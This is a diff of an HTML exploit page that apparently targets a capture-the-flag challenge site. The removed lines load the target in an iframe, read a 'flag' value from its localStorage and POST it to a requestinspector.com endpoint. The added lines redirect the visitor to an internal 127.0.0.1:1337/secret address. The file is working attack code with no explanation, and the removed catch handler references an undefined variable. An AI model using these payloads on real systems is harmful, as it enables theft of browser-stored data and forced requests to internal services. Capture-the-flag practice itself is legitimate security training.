@@ -1,36 +1,14 @@
 <!DOCTYPE html>
 <html lang="en">
     <head>
-        <meta charset="UTF-8" />
-        <title>ToRead Application</title>
+        <meta http-equiv="refresh" content="0; url=http://127.0.0.1:1337/secret">
+        <script type="text/javascript">
+            window.location.href = "http://127.0.0.1:1337/secret"
+        </script>
     </head>
     <body>
-        <div id="123"></div>
-        <iframe src="https://static-mistakes-4a27e2504ec596fe.ctfcup-2023.ru/">
-        </iframe>
+
     </body>
     <script>
-        const a = document.querySelector('iframe');
-        setTimeout(() => {
-            fetch(
-                'https://01hdwftvwz6fck8j6ntcdq26vs00-a22fe370aae401506893.requestinspector.com',
-                {
-                    method: 'POST',
-                    body: JSON.stringify({
-                        a: a.contentWindow.localStorage.getItem('flag'),
-                    }),
-                }
-            ).catch((e) =>
-                fetch(
-                    'https://01hdwftvwz6fck8j6ntcdq26vs00-a22fe370aae401506893.requestinspector.com',
-                    {
-                        method: 'POST',
-                        body: JSON.stringify({
-                            a: err,
-                        }),
-                    }
-                )
-            );
-        }, 2000);
     </script>
 </html>
